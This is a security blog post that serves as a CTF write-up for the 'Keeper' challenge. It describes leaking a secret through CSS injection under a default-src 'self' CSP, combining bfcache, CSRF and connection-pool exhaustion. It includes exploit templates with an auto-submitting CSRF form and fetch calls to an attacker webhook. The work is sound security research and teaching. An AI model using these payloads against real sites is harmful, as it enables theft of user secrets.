<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Is it possible to do CSS Exfiltration if default-src 'self' is specified in the CSP?"><title>CSS Exfiltration under default-src 'self' | Salvatore Abello's Blog</title>
<meta property="og:title" content="CSS Exfiltration under default-src 'self'"><meta property="og:description" content="Is it possible to do CSS Exfiltration if default-src 'self' is specified in the CSP?"><meta property="og:type" content="article"><meta property="og:url" content="https://salvatore-abello.github.io/posts/css-exfiltration-under-default-src-self/"><meta property="og:site_name" content="Salvatore Abello's Blog"><meta property="og:image" content="https://salvatore-abello.github.io/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"><meta name=twitter:card content="summary"><meta name=twitter:title content="CSS Exfiltration under default-src 'self'"><meta name=twitter:description content="Is it possible to do CSS Exfiltration if default-src 'self' is specified in the CSP?"><meta name=twitter:image content="https://salvatore-abello.github.io/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"><meta name=keywords content="Cybersec,Research,CSS,client-side,csp,Writeup"><meta property="article:published_time" content="2025-02-27T16:14:14+01:00"><meta property="article:modified_time" content="2025-02-27T16:14:14+01:00"><meta property="article:author" content="Salvatore Abello"><link rel=canonical href=https://salvatore-abello.github.io/posts/css-exfiltration-under-default-src-self/><link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/font.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/syntax.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><div id=root><header><div id=brand><a class=icon-link href=https://salvatore-abello.github.io/><img class=icon src=/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png></a><div class=text><a href=https://salvatore-abello.github.io/><h1>Salvatore Abello's Blog</h1></a><h3>Hacking & other stuff</h3></div></div><nav><a href=/><b>Home</b></a>
|
<a href=/whoami/><b>Whoami</b></a>
|
<a href=/achievements/><b>Achievements</b></a>
|
<a href=/posts/><b>Posts</b></a>
|
<a href=/cves/><b>CVEs</b></a>
| <a href=/index.xml class=rss-link title="RSS Feed"><b>RSS</b></a></nav><hr></header><div id=content><main><article><h1 class=title>CSS Exfiltration under default-src 'self'</h1><div class=post-meta><strong><span>Posted on</span>
<time>2025-02-27 16:14:14</time>
</strong><span>‚Ä¢ 3580 words</span>
<span>‚Ä¢ 17 minute read</span><div><span>Tags:</span>
<a href=/tags/cybersec>Cybersec</a>,
<a href=/tags/research>Research</a>,
<a href=/tags/css>CSS</a>,
<a href=/tags/client-side>client-side</a>,
<a href=/tags/csp>csp</a>,
<a href=/tags/writeup>Writeup</a></div></div><div class=content><p>CSS Injections have always fascinated me. A few months ago, I asked myself: <em>&ldquo;is it possible to do CSS Exfiltration if default-src &lsquo;self&rsquo; is specified in the CSP?&rdquo;</em></p><p>Well, if you&rsquo;re reading this you already know the answer is yes. Also, I wrote a challenge about this for TRX CTF 2025: <a href=https://github.com/TheRomanXpl0it/TRX-CTF-2025/tree/main/web/keeper>Keeper</a>. This post will serve both as a writeup for the challenge and as an explanation of this new &ldquo;technique&rdquo;.</p><h2 id=index><a class=full-clickable-heading href=#index>Index</a></h2><ul><li><a href=#index>Index</a></li><li><a href=#keeper>Keeper</a><ul><li><a href=#overview>Overview</a></li></ul></li><li><a href=#solution>Solution</a><ul><li><a href=#bfcache--csrf>bfcache & CSRF</a></li><li><a href=#swimming-in-the-connection-pool->Swimming in the Connection Pool üèä</a></li><li><a href=#deep-diving-into-chromium-internals>Deep Diving Into Chromium Internals</a><ul><li><a href=#stalled-requests-priorities--more>Stalled requests, priorities & more!</a></li></ul></li><li><a href=#abusing-groupid-hash-ordering>Abusing GroupId hash ordering</a></li></ul></li><li><a href=#putting-it-all-together>Putting it all together</a><ul><li><a href=#poc>PoC</a></li><li><a href=#limitations>Limitations</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#final-payload>Final payload</a><ul><li><a href=#server-code>Server Code</a><ul><li><a href=#serverpy>server.py</a></li><li><a href=#gen_csspy>gen_css.py</a></li></ul></li><li><a href=#templates>Templates</a><ul><li><a href=#csrfhtml>csrf.html</a></li><li><a href=#exploithtml>exploit.html</a></li><li><a href=#connection-poolhtml>connection-pool.html</a></li></ul></li><li><a href=#go-server>Go Server</a></li></ul></li></ul><h2 id=keeper><a class=full-clickable-heading href=#keeper>Keeper</a></h2><blockquote><p>Author: @salvatore-abello</p><p>Solves: 3</p></blockquote><p><img src=/images/image.png alt="alt text"></p><h2 id=overview><a class=full-clickable-heading href=#overview>Overview</a></h2><p>This is a simple web application to store secrets. The source code of a Python server using <code>Flask</code> is given and there are 4 important routes:</p><ul><li><code>/set-secret</code>, store a secret given a username and a 6-hexdigit code and then redirect to <code>/</code>. The username and the code will be saved in the session.</li><li><code>/</code>, render our secret without escaping it</li><li><code>/get-secret</code>, retrieve a secret given its username and code. Only one request every 5 seconds is allowed.</li><li><code>/visit</code>, trigger <code>bot.js</code> to visit a given URL. The bot username will be returned to us. This is the source code of <code>bot.js</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>        <span class=nx>page</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>context</span><span class=p>.</span><span class=nx>newPage</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>random_secret_code</span> <span class=o>=</span> <span class=nb>Array</span><span class=p>.</span><span class=nx>from</span><span class=p>(</span><span class=nx>crypto</span><span class=p>.</span><span class=nx>randomBytes</span><span class=p>(</span><span class=mi>6</span><span class=p>)).</span><span class=nx>map</span><span class=p>(</span><span class=nx>b</span> <span class=p>=&gt;</span> <span class=s2>&#34;ABCDEF0987654321&#34;</span><span class=p>[</span><span class=nx>b</span> <span class=o>%</span> <span class=mi>16</span><span class=p>]).</span><span class=nx>join</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>random_username</span> <span class=o>=</span> <span class=nb>Array</span><span class=p>.</span><span class=nx>from</span><span class=p>(</span><span class=nx>crypto</span><span class=p>.</span><span class=nx>randomBytes</span><span class=p>(</span><span class=mi>32</span><span class=p>)).</span><span class=nx>map</span><span class=p>(</span><span class=nx>b</span> <span class=p>=&gt;</span> <span class=s2>&#34;abcdefghijklmnopqrstuvwxyz&#34;</span><span class=p>[</span><span class=nx>b</span> <span class=o>%</span> <span class=mi>26</span><span class=p>]).</span><span class=nx>join</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>random_username</span><span class=si>}</span><span class=sb> will visit </span><span class=si>${</span><span class=nx>SITE</span><span class=si>}</span><span class=sb> first, and then </span><span class=si>${</span><span class=nx>url</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>SITE</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span> <span class=nx>waitUntil</span><span class=o>:</span> <span class=s2>&#34;domcontentloaded&#34;</span><span class=p>,</span> <span class=nx>timeout</span><span class=o>:</span> <span class=mi>5000</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>1500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;#first-code-digit&#34;</span><span class=p>,</span> <span class=nx>random_secret_code</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>click</span><span class=p>(</span><span class=s2>&#34;#next-btn&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;#username-input&#34;</span><span class=p>,</span> <span class=nx>random_username</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;#secret-input&#34;</span><span class=p>,</span> <span class=nx>FLAG</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>click</span><span class=p>(</span><span class=s2>&#34;#submit-button&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>1500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>browser</span><span class=p>)</span> <span class=kr>await</span> <span class=nx>browser</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>reject</span><span class=p>(</span><span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s2>&#34;Error: Setup failed, if this happens consistently on remote contact an admin&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>resolve</span><span class=p>(</span><span class=sb>`The user </span><span class=si>${</span><span class=nx>random_username</span><span class=si>}</span><span class=sb> will visit your URL soon`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=p>{</span> <span class=nx>waitUntil</span><span class=o>:</span> <span class=s2>&#34;domcontentloaded&#34;</span><span class=p>,</span> <span class=nx>timeout</span><span class=o>:</span> <span class=mi>5000</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>70_000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>Every response which won&rsquo;t send HTML is a <code>TextResponse</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=k>class</span> <span class=nc>TextResponse</span><span class=p>(</span><span class=n>Response</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>default_mimetype</span> <span class=o>=</span> <span class=s2>&#34;text/plain&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>response</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>super</span><span class=p>()</span><span class=o>.</span><span class=fm>__init__</span><span class=p>(</span><span class=n>response</span><span class=p>,</span> <span class=n>content_type</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>default_mimetype</span><span class=p>)</span>
</span></span></code></pre></div><p>Note that the Flask session cookie has <code>HttpOnly</code> attribute and also <code>SameSite=Strict</code>. Furthermore, the web application will send the following headers in every request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=nd>@app.after_request</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add_security_headers</span><span class=p>(</span><span class=n>resp</span><span class=p>:</span> <span class=n>Response</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s2>&#34;Content-Security-Policy&#34;</span><span class=p>]</span> <span class=o>=</span> \
</span></span><span class=line><span class=cl>        <span class=s2>&#34;default-src &#39;self&#39;;&#34;</span>\
</span></span><span class=line><span class=cl>        <span class=s2>&#34;base-uri &#39;none&#39;;&#34;</span>\
</span></span><span class=line><span class=cl>        <span class=s2>&#34;frame-src &#39;none&#39;;&#34;</span>\
</span></span><span class=line><span class=cl>        <span class=s2>&#34;frame-ancestors &#39;none&#39;;&#34;</span>\
</span></span><span class=line><span class=cl>        <span class=s2>&#34;style-src &#39;self&#39; &#39;unsafe-inline&#39;;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>resp</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s2>&#34;X-Content-Type-Options&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;nosniff&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s2>&#34;Referrer-Policy&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;no-referrer&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>resp</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s2>&#34;Cross-Origin-Opener-Policy&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;same-origin&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s2>&#34;Document-Policy&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;force-load-at-top&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s2>&#34;X-Frame-Options&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;SAMEORIGIN&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s2>&#34;Cache-Control&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;no-store&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>resp</span>
</span></span></code></pre></div><p>The goal now is pretty obvious: leak the bot code and then get the flag by sending a request to <code>/get-secret</code></p><h2 id=solution><a class=full-clickable-heading href=#solution>Solution</a></h2><h3 id=bfcache--csrf><a class=full-clickable-heading href=#bfcache--csrf>bfcache & CSRF</a></h3><p>To achieve our goal, we need to get the bot code and arbitrary HTML on the same page. How do we do this? Enter the <a href=https://developer.mozilla.org/en-US/docs/Glossary/bfcache>bfcache</a>. This cache stores entire pages, including dynamic modifications to the DOM. By letting the user visit a page we control, we can later go back in history using <code>window.history.go(-2)</code> where we will find the bot code.</p><p>Result (With <code>d-none</code> removed):</p><p><img src=/images/image-1.png alt="alt text"></p><p>When <code>window.history.go(-2)</code> is executed, the page becomes isolated from other pages due to the <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy>COOP</a> header. The next step is to do CSRF to set an arbitrary secret. This can be done by opening a separate window where a form targeting <code>http://localhost:1337/set-secret</code> will be submitted</p><p><strong>exploit.html</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>function</span> <span class=nx>popup</span><span class=p>(</span><span class=nx>url</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>w</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=s2>&#34;s1&#34;</span><span class=p>,</span> <span class=s2>&#34;width= 640, height= 480, left=0, top=0, resizable=yes, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>w</span><span class=p>.</span><span class=nx>blur</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nb>window</span><span class=p>.</span><span class=nx>focus</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nx>w</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>sleep</span> <span class=o>=</span> <span class=p>(</span><span class=nx>ms</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>ms</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kr>async</span> <span class=kd>function</span> <span class=nx>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;{{ webhook }}?STARTING&#34;</span><span class=p>,</span> <span class=p>{</span><span class=nx>mode</span><span class=o>:</span> <span class=s2>&#34;no-cors&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>2000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>w1</span> <span class=o>=</span> <span class=nx>popup</span><span class=p>(</span><span class=sb>`/csrf`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span> <span class=c1>// wait for form submission
</span></span></span><span class=line><span class=cl><span class=c1></span>            
</span></span><span class=line><span class=cl>            <span class=nb>window</span><span class=p>.</span><span class=nx>history</span><span class=p>.</span><span class=nx>go</span><span class=p>(</span><span class=o>-</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s2>&#34;DOMContentLoaded&#34;</span><span class=p>,</span> <span class=nx>main</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p><strong>csrf.html</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;container text-center&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;row justify-content-center mb-3&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;col-10 col-md-6&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>h5</span><span class=p>&gt;</span>Input your secret here:<span class=p>&lt;/</span><span class=nt>h5</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;{{ chall_url }}/set-secret&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;input&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-control&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;code&#34;</span> <span class=na>rows</span><span class=o>=</span><span class=s>&#34;2&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;{{ random_password }}&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>input</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;input&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-control&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;username&#34;</span> <span class=na>rows</span><span class=o>=</span><span class=s>&#34;2&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;{{ random_username }}&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>input</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;input&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-control&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;secret&#34;</span> <span class=na>rows</span><span class=o>=</span><span class=s>&#34;2&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;{{ css_payload }}&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>input</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>button</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;btn btn-primary mt-3&#34;</span><span class=p>&gt;</span>Submit<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;row justify-content-center&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;col-10 col-md-6&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;secret-container border p-3&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;hover-text&#34;</span><span class=p>&gt;</span>Hover me to show the secret<span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;secret-div&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;secret&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span> 
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>sleep</span> <span class=o>=</span> <span class=p>(</span><span class=nx>ms</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>ms</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>async</span> <span class=kd>function</span> <span class=nx>csrf_submit</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>50</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>forms</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>submit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;{{ webhook }}?DOING_CSRF&#34;</span><span class=p>,</span> <span class=p>{</span><span class=nx>mode</span><span class=o>:</span> <span class=s2>&#34;no-cors&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>csrf_submit</span><span class=p>();</span>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p><strong>Result</strong></p><p><img src=/images/image-2.png alt="alt text"></p><p>Nice. Since no script can be executed, the only thing that can be done is CSS Injection. Since the single code digits are in separate <code>&lt;input></code> tags, a simple Text Node Exfiltration is enough to leak the code. This can be done via <a href=https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face>font-face at rule</a> and unicode-range, <a href=https://book.hacktricks.wiki/en/pentesting-web/xs-search/css-injection/index.html#font-face--unicode-range>as described here</a>. There&rsquo;s only one problem: this technique won&rsquo;t work since <code>default-src: self</code> is specified in the CSP, so no external requests can be sent.</p><p>So, how can we leak the code without sending external requests?
This is where the Connection Pool comes into play.</p><h3 id=swimming-in-the-connection-pool-><a class=full-clickable-heading href=#swimming-in-the-connection-pool->Swimming in the Connection Pool üèä</a></h3><p>Abusing the connection pool is not a new concept, and there have been numerous challenges built around this. The core idea is that browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources, browsers have to impose a limit<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>. If all sockets are occupied, no other requests can be made until one is freed. This can be exploited to measure the loading time of a request from another page or to detect if a resource has been requested.<br>However, the following technique involves counting the number of requests made. For this purpose, I developed a method using CSS injection to map each character in the charset (<code>abcdef0987654321</code>) to a specific number of requests, ranging from 3 to 18. These requests are initiated using the <code>@font-face</code> at-rule by specifying a corresponding number of URLs in the <code>src</code> property. The browser attempts to load each URL sequentially until it finds a valid one<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>. Since all provided URLs return a 404 error, the browser tries all of them. Here&rsquo;s an example:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-css data-lang=css><span class=line><span class=cl><span class=p>@</span><span class=k>font-face</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>font-family</span><span class=p>:</span><span class=nd>has_A</span><span class=o>;</span>
